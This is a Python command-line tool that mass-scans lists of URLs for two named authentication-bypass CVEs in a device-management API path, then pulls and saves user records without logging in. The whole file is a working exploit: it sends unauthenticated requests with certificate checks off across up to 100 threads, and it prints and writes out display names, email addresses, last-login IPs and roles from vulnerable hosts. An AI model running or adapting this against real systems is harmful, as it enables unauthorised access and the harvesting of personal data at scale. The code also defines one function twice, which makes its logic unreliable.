import requests
import argparse
import urllib3
from rich import print
import concurrent.futures
from alive_progress import alive_bar

urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)

def fetch_data(base_url, path, verbose=True):
    url = f"{base_url}/{path}/api/v2/authorized/users?adminDeviceSpaceId=1"
    if verbose:
        print(f"[blue]Fetching data from:[/blue] {url}")
    response = requests.get(url, verify=False, timeout=30)
    try:
        json_data = response.json()
        print(f"[bold red]{base_url} may be vulnerable[/bold red]")
        return json_data
    except ValueError:
        if verbose:
            print("[green]The response is not a valid JSON. The site is not vulnerable.[/green]")
        return None

def mass_urls(urls, verbose, output_file=None):
    with alive_bar(len(urls), title='Processing URLs') as bar:
        with concurrent.futures.ThreadPoolExecutor(max_workers=100) as executor:
            futures = {executor.submit(process_url, url, verbose, output_file): url for url in urls}
            for future in concurrent.futures.as_completed(futures):
                bar()

def process_url(base_url, verbose, output_file=None):
    vulnerabilities = {
        "mifs/asfV3": "CVE-2023-35082",
        "mifs/aad": "CVE-2023-35078"
    }

    cves_found = []  # To store CVEs found for the URL

    for path, cve in vulnerabilities.items():
        data = fetch_data(base_url, path, verbose)
        if data:
            cves_found.append(cve)
            
    if data:
        process_data(base_url, data, cves_found, verbose, output_file)

def fetch_data(base_url, path, verbose=True):
    url = f"{base_url}/{path}/api/v2/authorized/users?adminDeviceSpaceId=1"
    if verbose:
        print(f"[blue]Fetching data from:[/blue] {url}")
    response = requests.get(url, verify=False, timeout=10)
    try:
        json_data = response.json()
        return json_data
    except ValueError:
        if verbose:
            print("[green]The response is not a valid JSON. The site is not vulnerable.[/green]")
        return None

def process_data(base_url, data, cve, verbose, output_file=None):
    print(f"[bold red]{base_url} may be vulnerable to {', '.join(cve)}[/bold red]")
    emails = []  # To store the first 5 email addresses
    for result in data["results"]:
        email = result["email"]
        if email and verbose:
            display_name = result["displayName"]
            last_login_ip = result["lastLoginIp"]
            roles = ', '.join(result["roles"])
            print(f"[green]Display Name:[/green] {display_name}")
            print(f"[blue]Last Login IP:[/blue] {last_login_ip}")
            print(f"[magenta]Email Address:[/magenta] {email}")
            print(f"[yellow]Roles:[/yellow] {roles}")
            print("-" * 50)

            emails.append(email)    

    emails = list(dict.fromkeys(emails))

    if verbose:
        print(f"[blue]First 10 Emails:[/blue] {', '.join(emails[:10])}")

    if output_file:
        with open(output_file, "a") as file:
            file.write(f"{base_url}, [{', '.join(cve)}], {', '.join(emails[:5])}\n")


def main():
    parser = argparse.ArgumentParser(description="Fetch and display user information")
    parser.add_argument('-u', '--url', help="Base URL for the request")
    parser.add_argument('-f', '--file', help="File containing a list of URLs for mass scanning")
    parser.add_argument('-o', '--output', help="Output file to save vulnerable URLs and first 5 emails")
    parser.add_argument('--verbose', action='store_true', help="Verbose mode")
    args = parser.parse_args()

    if args.url:
        process_url(args.url, args.verbose, args.output)
    elif args.file:
        with open(args.file, "r") as file:
            urls = [line.strip() for line in file]
            mass_urls(urls, args.verbose, args.output)

if __name__ == "__main__":
    main()
